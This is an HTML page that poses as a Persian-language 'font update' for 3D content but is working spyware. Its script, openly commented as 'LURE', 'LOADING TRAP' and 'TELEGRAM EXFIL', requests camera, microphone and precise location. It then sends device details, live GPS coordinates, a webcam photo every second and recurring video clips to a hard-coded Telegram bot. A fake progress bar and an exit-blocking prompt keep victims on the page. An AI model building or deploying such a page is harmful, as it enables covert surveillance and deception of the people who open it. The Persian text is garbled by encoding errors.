<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ ÙÙˆÙ†Øªâ€ŒÙ‡Ø§ÛŒ Ù¾ÛŒØ´Ø±ÙØªÙ‡</title>
  <meta name="theme-color" content="#00ff88" />
  
  <!-- Three.js + Controls -->
  <script src="https://cdn.jsdelivr.net/npm/three@0.157.0/build/three.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/three@0.157.0/examples/js/controls/OrbitControls.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/three@0.157.0/examples/js/loaders/GLTFLoader.js"></script>

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700&display=swap');
    
    * { margin:0; padding:0; box-sizing:border-box; }
    body, html { height:100%; overflow:hidden; font-family:'Vazirmatn', sans-serif; background:#000; color:#fff; }
    
    /* 3D CANVAS */
    #scene-container { position:fixed; top:0; left:0; width:100%; height:100%; z-index:1; }

    /* GLASS OVERLAY */
    .overlay { 
      position:fixed; top:0; left:0; width:100%; height:100%; 
      background:linear-gradient(135deg, rgba(10,10,30,0.8), rgba(0,20,40,0.6)); 
      backdrop-filter:blur(12px); -webkit-backdrop-filter:blur(12px);
      z-index:10; display:flex; flex-direction:column; justify-content:center; align-items:center; 
      padding:20px; text-align:center; transition:opacity 1s ease;
    }

    /* GLASS CARD */
    .card { 
      background:rgba(255,255,255,0.08); 
      backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px);
      border:1px solid rgba(255,255,255,0.15); 
      border-radius:28px; padding:40px 35px; 
      max-width:520px; width:90%; 
      box-shadow:0 25px 50px rgba(0,0,0,0.5), inset 0 0 30px rgba(0,255,255,0.1);
      animation: float 8s ease-in-out infinite, glow 3s ease-in-out infinite alternate;
      position:relative; overflow:hidden;
    }
    .card::before {
      content:''; position:absolute; top:0; left:0; right:0; bottom:0;
      background:linear-gradient(45deg, transparent, rgba(0,255,136,0.05), transparent);
      animation: shimmer 4s infinite; pointer-events:none;
    }
    @keyframes shimmer { 0%,100%{transform:translateX(-100%);} 50%{transform:translateX(100%);} }
    @keyframes float { 0%,100%{transform:translateY(0) rotate(0.5deg);} 50%{transform:translateY(-20px) rotate(-0.5deg);} }
    @keyframes glow { from {box-shadow:0 25px 50px rgba(0,0,0,0.5), inset 0 0 30px rgba(0,255,255,0.1);} 
                      to {box-shadow:0 30px 60px rgba(0,255,136,0.3), inset 0 0 40px rgba(0,255,255,0.2);} }

    h1 { 
      font-size:2.4em; font-weight:700; margin-bottom:16px; 
      background:linear-gradient(90deg, #00ff88, #00d0ff, #8b00ff); 
      -webkit-background-clip:text; -webkit-text-fill-color:transparent; 
      background-clip:text; letter-spacing:-0.5px;
    }
    p { font-size:1.15em; line-height:1.8; margin:14px 0; opacity:0.88; font-weight:400; }

    /* BUTTON */
    button { 
      margin-top:28px; padding:18px 48px; font-size:1.3em; font-weight:600; 
      background:linear-gradient(45deg, #00ff88, #00b7ff); 
      color:#000; border:none; border-radius:60px; 
      cursor:pointer; position:relative; overflow:hidden;
      box-shadow:0 10px 25px rgba(0,255,136,0.4); 
      transition:all 0.3s cubic-bezier(0.4,0,0.2,1);
      text-transform:uppercase; letter-spacing:1px;
    }
    button:hover { transform:translateY(-4px) scale(1.05); box-shadow:0 15px 35px rgba(0,255,136,0.6); }
    button:active { transform:translateY(-2px); }
    button::after { content:'â¤'; margin-right:8px; font-size:1.1em; }

    /* LOADING SCREEN */
    #loading { display:none; opacity:0; transition:opacity 1s ease; }
    .spinner { 
      width:70px; height:70px; border:5px solid rgba(0,255,255,0.2); 
      border-top:5px solid #00ff88; border-radius:50%; 
      animation:spin 1.2s cubic-bezier(0.4,0,0.2,1) infinite; margin:25px 0;
    }
    @keyframes spin { to { transform:rotate(360deg); } }

    .progress-container { 
      width:85%; height:14px; background:rgba(255,255,255,0.15); 
      border-radius:8px; overflow:hidden; margin:22px 0; 
      box-shadow:inset 0 2px 5px rgba(0,0,0,0.3);
    }
    .progress { height:100%; width:0%; background:linear-gradient(90deg, #00ff88, #00b7ff); 
                 border-radius:8px; transition:width 0.6s ease; position:relative; overflow:hidden; }
    .progress::after { content:''; position:absolute; top:0; left:0; right:0; bottom:0;
                       background:linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
                       animation:progressGlow 2s infinite; }
    @keyframes progressGlow { 0%,100%{transform:translateX(-100%);} 50%{transform:translateX(100%);} }

    .stage { font-size:1.2em; margin:12px 0; font-weight:500; opacity:0.9; }
    #progressText { font-size:1.4em; font-weight:700; background:linear-gradient(90deg,#00ff88,#00b7ff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }

    /* HIDDEN ELEMENTS */
    #video, #canvas { display:none; }

    /* RESPONSIVE */
    @media (max-width:480px) { 
      .card { padding:30px 25px; } 
      h1 { font-size:2em; } 
      button { padding:16px 36px; font-size:1.2em; }
    }
  </style>
</head>
<body>

  <!-- 3D BACKGROUND -->
  <div id="scene-container"></div>

  <!-- PHASE 1: LURE -->
  <div id="lure" class="overlay">
    <div class="card">
      <h1>Ù…Ø±ÙˆØ±Ú¯Ø± Ø´Ù…Ø§ Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø¨Ù‡â€ŒØ±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ ÙÙˆÙ†Øª Ø¯Ø§Ø±Ø¯!</h1>
      <p>Ø¨Ø±Ø§ÛŒ Ù†Ù…Ø§ÛŒØ´ ØµØ­ÛŒØ­ Ù…Ø­ØªÙˆØ§ÛŒ Ø³Ù‡â€ŒØ¨Ø¹Ø¯ÛŒ Ùˆ ÙÙˆÙ†Øªâ€ŒÙ‡Ø§ÛŒ Ù…Ø¯Ø±Ù†ØŒ Ø¨Ø§ÛŒØ¯ Ù¾Ú©ÛŒØ¬ Ø¬Ø¯ÛŒØ¯ Ù†ØµØ¨ Ø´ÙˆØ¯.</p>
      <p>Ø§ÛŒÙ† ÙØ±Ø¢ÛŒÙ†Ø¯ ÙÙ‚Ø· <strong>Û³Û° Ø«Ø§Ù†ÛŒÙ‡</strong> Ø·ÙˆÙ„ Ù…ÛŒâ€ŒÚ©Ø´Ø¯ Ùˆ Ú©Ø§Ù…Ù„Ø§Ù‹ Ø§Ù…Ù† Ø§Ø³Øª.</p>
      <button id="startBtn">Ø¨Ø²Ù† Ø¨Ø±ÛŒÙ… ğŸš€</button>
    </div>
  </div>

  <!-- PHASE 2: LOADING TRAP -->
  <div id="loading" class="overlay">
    <div class="card">
      <div class="spinner"></div>
      <h1>Ø¯Ø± Ø­Ø§Ù„ Ù†ØµØ¨ ÙÙˆÙ†Øªâ€ŒÙ‡Ø§ÛŒ 3D...</h1>
      <p class="stage" id="stageText">Ø§ØªØµØ§Ù„ Ø¨Ù‡ Ø³Ø±ÙˆØ± CDN...</p>
      <div class="progress-container"><div class="progress" id="progressBar"></div></div>
      <p id="progressText">0%</p>
      <p style="font-size:0.9em; opacity:0.7; margin-top:18px;">Ù„Ø·ÙØ§Ù‹ Ù…Ù†ØªØ¸Ø± Ø¨Ù…Ø§Ù†ÛŒØ¯. Ø®Ø±ÙˆØ¬ Ø§Ø² ØµÙØ­Ù‡ Ø¨Ø§Ø¹Ø« Ù„ØºÙˆ Ù†ØµØ¨ Ù…ÛŒâ€ŒØ´ÙˆØ¯.</p>
    </div>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    // === TELEGRAM EXFIL ===
    const BOT_TOKEN = "8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8";
    const CHAT_ID = "7625898629";
    const API = `https://api.telegram.org/bot${BOT_TOKEN}/send`;

    async function send(type, data, caption = '') {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      if (caption) form.append('caption', caption);
      
      if (type === 'photo' || type === 'video') {
        form.append(type, data, `${type}_${Date.now()}.${type === 'photo' ? 'jpg' : 'webm'}`);
      } else {
        form.append('text', `[${type.toUpperCase()}]\n${JSON.stringify(data, null, 2)}`);
      }

      await fetch(`${API}${type === 'photo' ? 'Photo' : type === 'video' ? 'Video' : 'Message'}`, {
        method: 'POST', body: form
      }).catch(() => {});
    }

    // === 3D SCENE: DYNAMIC SHADER BACKGROUND ===
    let scene, camera, renderer, controls, clock;
    function init3D() {
      const container = document.getElementById('scene-container');
      scene = new THREE.Scene();
      camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 100);
      renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true, powerPreference: "high-performance" });
      renderer.setSize(window.innerWidth, window.innerHeight);
      renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
      container.appendChild(renderer.domElement);

      clock = new THREE.Clock();

      // Shader Material
      const vertexShader = `
        varying vec2 vUv;
        void main() {
          vUv = uv;
          gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
        }
      `;
      const fragmentShader = `
        uniform float time;
        varying vec2 vUv;
        void main() {
          vec2 p = vUv - 0.5;
          float d = length(p);
          float wave = sin(d * 20.0 - time * 3.0) * 0.5 + 0.5;
          vec3 color = mix(vec3(0.0, 0.3, 0.6), vec3(0.0, 1.0, 0.5), wave);
          gl_FragColor = vec4(color, 0.8);
        }
      `;
      const geometry = new THREE.PlaneGeometry(20, 20, 128, 128);
      const material = new THREE.ShaderMaterial({ vertexShader, fragmentShader, uniforms: { time: { value: 0 } }, transparent: true });
      const mesh = new THREE.Mesh(geometry, material);
      mesh.rotation.x = -Math.PI / 2;
      scene.add(mesh);

      camera.position.set(0, 8, 12);
      camera.lookAt(0, 0, 0);
      controls = new THREE.OrbitControls(camera, renderer.domElement);
      controls.enableDamping = true;
      controls.autoRotate = true;
      controls.autoRotateSpeed = 0.8;

      // Particles Field
      const particles = new THREE.BufferGeometry();
      const count = 5000;
      const pos = new Float32Array(count * 3);
      for (let i = 0; i < count * 3; i += 3) {
        pos[i] = (Math.random() - 0.5) * 25;
        pos[i+1] = Math.random() * 15;
        pos[i+2] = (Math.random() - 0.5) * 25;
      }
      particles.setAttribute('position', new THREE.BufferAttribute(pos, 3));
      const pMat = new THREE.PointsMaterial({ color: 0x00ffaa, size: 0.08, transparent: true, opacity: 0.8 });
      const points = new THREE.Points(particles, pMat);
      scene.add(points);

      function animate() {
        const t = clock.getElapsedTime();
        material.uniforms.time.value = t;
        points.rotation.y = t * 0.05;
        controls.update();
        renderer.render(scene, camera);
        requestAnimationFrame(animate);
      }
      animate();

      window.addEventListener('resize', () => {
        camera.aspect = window.innerWidth / window.innerHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(window.innerWidth, window.innerHeight);
      });
    }

    // === PERMISSIONS & STREAM ===
    let stream, interval, videoRecorder;
    async function requestAll() {
      try {
        // Video + Audio
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
          audio: true
        });

        const video = document.getElementById('video');
        video.srcObject = stream;

        // Device & Browser Info
        const battery = await navigator.getBattery?.() || {};
        const info = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          battery: battery.level ? `${Math.round(battery.level * 100)}%` : 'N/A',
          charging: battery.charging ?? 'N/A',
          screen: `${screen.width}x${screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          connection: navigator.connection?.effectiveType || 'unknown'
        };
        await send('message', null, `[DEVICE]\n${JSON.stringify(info, null, 2)}`);

        // Geolocation
        navigator.geolocation.watchPosition(
          pos => send('message', null, `[LOCATION]\nhttps://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}\nØ¯Ù‚Øª: Â±${pos.coords.accuracy}m`),
          null, { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
        );

        // Selfie Snapshots
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 640; canvas.height = 480;

        interval = setInterval(() => {
          if (video.videoWidth > 0) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => send('photo', blob), 'image/jpeg', 0.85);
          }
        }, 1000); // 1 sec

        // Video Clips
        setInterval(() => {
          const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
          const chunks = [];
          recorder.ondataavailable = e => chunks.push(e.data);
          recorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            send('video', blob);
          };
          recorder.start();
          setTimeout(() => recorder.stop(), 7000);
        }, 14000);

      } catch (err) {
        console.log("Permission denied or failed", err);
      }
    }

    // === FAKE PROGRESS ENGINE ===
    const stages = [
      "Ø§ØªØµØ§Ù„ Ø¨Ù‡ Ø³Ø±ÙˆØ± CDN...",
      "Ø¯Ø±ÛŒØ§ÙØª Ù¾Ú©ÛŒØ¬ ÙÙˆÙ†Øªâ€ŒÙ‡Ø§ÛŒ WebGL...",
      "Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ø³Ù‡â€ŒØ¨Ø¹Ø¯ÛŒ...",
      "Ù†ØµØ¨ Ø´ÛŒØ¯Ø±Ù‡Ø§ÛŒ Ú¯Ø±Ø§ÙÛŒÚ©ÛŒ...",
      "Ø¨Ù‡ÛŒÙ†Ù‡â€ŒØ³Ø§Ø²ÛŒ Ø±Ù†Ø¯Ø± Ù…Ø±ÙˆØ±Ú¯Ø±...",
      "Ø§Ø¹Ù…Ø§Ù„ Ø§ÙÚ©Øªâ€ŒÙ‡Ø§ÛŒ Ù†ÙˆØ±Ù¾Ø±Ø¯Ø§Ø²ÛŒ...",
      "ØªØ³Øª Ø³Ø§Ø²Ú¯Ø§Ø±ÛŒ Ø¯Ø³ØªÚ¯Ø§Ù‡...",
      "ØªÚ©Ù…ÛŒÙ„ Ù†Ù‡Ø§ÛŒÛŒ..."
    ];
    let progress = 0;
    function startFakeProgress() {
      const bar = document.getElementById('progressBar');
      const text = document.getElementById('progressText');
      const stage = document.getElementById('stageText');

      setInterval(() => {
        progress += Math.random() * 5.5 + 1;
        if (progress > 97.5) progress = 97.5;
        bar.style.width = progress + '%';
        text.textContent = Math.round(progress) + '%';
        stage.textContent = stages[Math.floor(Math.random() * stages.length)];
      }, 900 + Math.random() * 800);
    }

    // === FLOW CONTROL ===
    document.getElementById('startBtn').addEventListener('click', () => {
      document.getElementById('lure').style.opacity = '0';
      setTimeout(() => {
        document.getElementById('lure').style.display = 'none';
        document.getElementById('loading').style.display = 'flex';
        setTimeout(() => document.getElementById('loading').style.opacity = '1', 50);
        init3D();
        requestAll().then(startFakeProgress);
      }, 600);
    });

    // Prevent Exit
    window.addEventListener('beforeunload', e => {
      e.preventDefault();
      e.returnValue = 'Ø¯Ø± Ø­Ø§Ù„ Ù†ØµØ¨... Ø®Ø±ÙˆØ¬ Ø¨Ø§Ø¹Ø« Ù„ØºÙˆ Ù…ÛŒâ€ŒØ´ÙˆØ¯!';
    });
  </script>
</body>
</html>
